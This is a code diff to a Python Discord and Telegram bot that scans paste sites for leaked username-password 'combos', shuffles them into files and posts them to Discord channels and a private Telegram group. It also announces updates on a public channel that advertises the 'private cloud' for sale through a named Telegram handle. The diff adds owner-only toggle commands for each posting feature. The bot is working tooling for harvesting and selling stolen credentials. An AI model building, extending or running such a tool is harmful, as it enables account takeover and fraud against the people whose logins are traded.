@@ -51,6 +51,17 @@ start_time = time.time()
 stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
 scan_lock  = asyncio.Lock()
 
+# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
+toggles = {
+    "scanning":        True,   # master on/off for scanning
+    "discord_urls":    True,   # post URL list to channel 1
+    "discord_alerts":  True,   # post new URL alerts to channel 2
+    "discord_content": True,   # post combo file to channel 3
+    "telegram":        True,   # post to private telegram
+    "telegram_public": True,   # post update message to public telegram
+    "owner_dm":        True,   # DM owner on new file
+}
+
 def load_seen() -> set:
     if Path(SEEN_FILE).exists():
         try:
@@ -194,6 +205,9 @@ async def monitor_loop():
         log.error(f"Could not get channel: {e}")
         return
 
+    if not toggles["scanning"]:
+        return
+
     if scan_lock.locked():
         log.info("Scan already in progress, skipping this cycle")
         return
@@ -305,11 +319,12 @@ async def monitor_loop():
                 log.info(f"{len(new_pastes)} new paste(s) detected")
 
                 # ── Step 5: new URL alerts to channel 2 ───────────────────
-                try:
-                    new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
-                    await post_new_alerts(new_channel, new_pastes)
-                except Exception as e:
-                    log.error(f"Could not post to new channel: {e}")
+                if toggles["discord_alerts"]:
+                    try:
+                        new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
+                        await post_new_alerts(new_channel, new_pastes)
+                    except Exception as e:
+                        log.error(f"Could not post to new channel: {e}")
 
                 # ── Step 6: extract creds & post to channel 3 ─────────────
                 try:
@@ -348,41 +363,43 @@ async def monitor_loop():
                         filename = f"{label}_{ts}.txt"
 
                         # Discord
-                        await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
-                        log.info(f"Posted to Discord as {filename}")
+                        if toggles["discord_content"]:
+                            await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                            log.info(f"Posted to Discord as {filename}")
 
                         # DM owner
-                        try:
-                            owner = await bot.fetch_user(OWNER_ID)
-                            total = sum(len(b.splitlines()) for b in combined)
-                            await owner.send(f"✅ New {label.upper()} detected — {total} combos")
-                        except Exception as e:
-                            log.error(f"Failed to DM owner: {e}")
+                        if toggles["owner_dm"]:
+                            try:
+                                owner = await bot.fetch_user(OWNER_ID)
+                                total = sum(len(b.splitlines()) for b in combined)
+                                await owner.send(f"✅ New {label.upper()} detected — {total} combos")
+                            except Exception as e:
+                                log.error(f"Failed to DM owner: {e}")
 
                         # Telegram
-                        all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
-                        random.shuffle(all_creds)
-                        tg_header = (
-                            f"WAR CLOUD PRIVATE {label.upper()}\n"
-                            "------------------------\n"
-                            "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                            "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                            "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
-                        )
-                        await send_telegram_file(tg_header + "\n".join(all_creds), filename)
+                        if toggles["telegram"]:
+                            all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
+                            random.shuffle(all_creds)
+                            tg_header = (
+                                f"WAR CLOUD PRIVATE {label.upper()}\n"
+                                "------------------------\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
+                            )
+                            await send_telegram_file(tg_header + "\n".join(all_creds), filename)
 
-                        # Send combo count to private channel
-                        async with aiohttp.ClientSession() as sess:
-                            await sess.post(
-                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                json={"chat_id": TELEGRAM_CHAT, "text": f"{len(all_creds)} COMBO FILE"}
-                            )
-                            # Send update to public channel
-                            pub_text = f"PRIVATE CLOUD UPDATED !\n-File name: {filename}\n-Lines: {len(all_creds)}\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
-                            await sess.post(
-                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                json={"chat_id": TELEGRAM_PUBLIC_CHAT, "text": pub_text}
-                            )
+                            async with aiohttp.ClientSession() as sess:
+                                await sess.post(
+                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                    json={"chat_id": TELEGRAM_CHAT, "text": f"{len(all_creds)} COMBO FILE"}
+                                )
+                                if toggles["telegram_public"]:
+                                    pub_text = f"PRIVATE CLOUD UPDATED !\n-File name: {filename}\n-Lines: {len(all_creds)}\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
+                                    await sess.post(
+                                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                        json={"chat_id": TELEGRAM_PUBLIC_CHAT, "text": pub_text}
+                                    )
 
 
                     else:
@@ -409,6 +426,33 @@ async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCA
     await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
     await monitor_loop()
     await interaction.followup.send("✅ Done.", ephemeral=True)
+
+
+@tree.command(name="toggle", description="Enable or disable a bot feature")
+@app_commands.describe(feature="Feature to toggle")
+@app_commands.choices(feature=[
+    app_commands.Choice(name="scanning",        value="scanning"),
+    app_commands.Choice(name="discord_urls",    value="discord_urls"),
+    app_commands.Choice(name="discord_alerts",  value="discord_alerts"),
+    app_commands.Choice(name="discord_content", value="discord_content"),
+    app_commands.Choice(name="telegram",        value="telegram"),
+    app_commands.Choice(name="telegram_public", value="telegram_public"),
+    app_commands.Choice(name="owner_dm",        value="owner_dm"),
+])
+async def cmd_toggle(interaction: discord.Interaction, feature: str):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
+        return
+    toggles[feature] = not toggles[feature]
+    state = "✅ ON" if toggles[feature] else "❌ OFF"
+    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)
+
+
+@tree.command(name="toggles", description="Show current status of all toggles")
+async def cmd_toggles(interaction: discord.Interaction):
+    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
+    await interaction.response.send_message("\n".join(lines), ephemeral=True)
+
 
 
 @tree.command(name="stats", description="Show bot stats")
